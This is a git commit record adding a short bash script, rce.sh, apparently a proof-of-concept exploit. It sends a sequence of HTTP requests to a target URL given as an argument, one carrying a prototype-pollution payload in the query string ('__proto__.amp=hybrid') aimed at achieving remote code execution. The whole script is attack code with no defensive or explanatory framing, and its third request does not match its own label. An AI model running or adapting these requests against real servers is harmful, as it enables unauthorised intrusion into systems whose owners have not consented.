d3c35afd361b77c847980bcd0d66133b2210eac8
WinparWinpar <96503073+WinparWinpar@users.noreply.github.com>
2022-04-12 15:56:45 -0500

    Update rce.sh

--- rce.sh
+++ rce.sh
@@ -1,1 +1,10 @@
+#!/usr/bin/env bash
 
+echo "request 1: /"
+http --quiet $1
+
+echo "request 2: /?amp=1&__proto__.amp=hybrid"
+http --quiet $1/\?amp\=1\&__proto__.amp\=hybrid
+
+echo "request 3: /?validator=[link]"
+http --quiet --timeout=5 $1/\?amp\=1\&__proto__.amp\=hybrid
